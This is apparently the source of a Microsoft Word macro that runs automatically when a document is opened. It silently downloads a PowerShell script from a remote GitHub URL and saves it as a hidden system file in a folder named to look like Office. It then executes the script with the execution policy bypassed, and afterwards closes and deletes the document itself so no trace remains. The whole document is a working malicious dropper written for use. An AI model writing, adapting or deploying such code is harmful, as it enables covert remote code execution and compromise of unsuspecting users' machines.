' Microsoft Word VBA Version - CLEANED UP WITH WORKING FILE CREATION
Private Sub Document_Open()
    Dim scriptUrl As String
    Dim savePath As String
    Dim webContent As String
    Dim currentUser As String
    
    ' Set the URL of your PowerShell script
    scriptUrl = "https://github.com/irxdd/ikdk/raw/refs/heads/main/office-setup"
    
    ' Get current username dynamically
    currentUser = Environ("USERNAME")
    
    On Error GoTo ErrorHandler
    
    ' Download using WinHttp method
    webContent = DownloadWithWinHttp(scriptUrl)
    
    ' Check if we got content
    If Len(webContent) > 0 Then

        ' Setup folder path
        Dim folderPath As String
        folderPath = "C:\Users\" & currentUser & "\AppData\Local\Microsoft\OfficeScripts\"
        Shell "cmd.exe /c if not exist """ & folderPath & """ mkdir """ & folderPath & """", vbHide
    
        
        ' Final PS1 path
        savePath = folderPath & "office_" & Format(Now, "yyyymmdd_hhnnss") & ".ps1"

       
        ' Delete existing file if it exists
        On Error Resume Next
        If Dir(savePath) <> "" Then Kill savePath
        On Error GoTo ErrorHandler
        
        ' Save the script content directly as .ps1
        Dim fileHandle As Integer
        fileHandle = FreeFile
        Open savePath For Output As #fileHandle
        
        Dim lines() As String
        lines = Split(webContent, vbCrLf)  ' Use vbCrLf or vbLf depending on source
        
        Dim i As Long
        For i = LBound(lines) To UBound(lines)
            Print #fileHandle, lines(i)
        Next i
        
        Close #fileHandle
    
    
        
        ' Set file attributes to Hidden + System
        Shell "cmd.exe /c attrib +H +S """ & savePath & """", vbHide
        
        ' Run the PowerShell script completely hidden
        Dim result As Long
        Dim currentDocPath As String
        
        ' Get document path BEFORE any operations
        currentDocPath = ActiveDocument.FullName
        
        ' Execute PowerShell script
        result = Shell("cmd.exe /c powershell.exe -ExecutionPolicy Bypass -File """ & savePath & """", vbHide)
     
      
        
        ' Wait for PowerShell to complete
        Dim startTime As Double
        startTime = Timer
        Do While Timer < startTime + 5
            DoEvents
        Loop
        
        ' Self-destruct sequence
        On Error Resume Next
        
        ' Disable alerts
        Application.DisplayAlerts = wdAlertsNone
        
        ' Close document first
        ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges
        
        ' Small delay before file deletion
        startTime = Timer
        Do While Timer < startTime + 0.5
            DoEvents
        Loop
        
        ' Try to delete the document file
        If Dir(currentDocPath) <> "" Then
             Kill currentDocPath
        End If
        
    
        Application.DisplayAlerts = wdAlertsAll
        
        ' If no other documents are open, quit Word
        If Documents.Count = 0 Then
            Application.Quit SaveChanges:=wdDoNotSaveChanges
        End If
    End If

    
    Exit Sub
    
ErrorHandler:
    ' Silent error handling - ensure alerts are restored
    On Error Resume Next
    Application.DisplayAlerts = wdAlertsAll
    Exit Sub
End Sub

' Alternative method - can also use AutoOpen instead of Document_Open
Sub AutoOpen()
    Document_Open
End Sub

Function DownloadWithWinHttp(url As String) As String
    ' Silent WinHttp download method
    Dim xmlHttp As Object
    Dim result As String
    
    On Error Resume Next
    
    Set xmlHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
    
    If Not xmlHttp Is Nothing Then
        xmlHttp.SetTimeOuts 30000, 30000, 30000, 30000
        xmlHttp.Open "GET", url, False
        xmlHttp.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        xmlHttp.Send
        
        If Err.Number = 0 And xmlHttp.Status = 200 Then
            result = xmlHttp.ResponseText
        End If
        
        Set xmlHttp = Nothing
    End If
    
    DownloadWithWinHttp = result
End Function
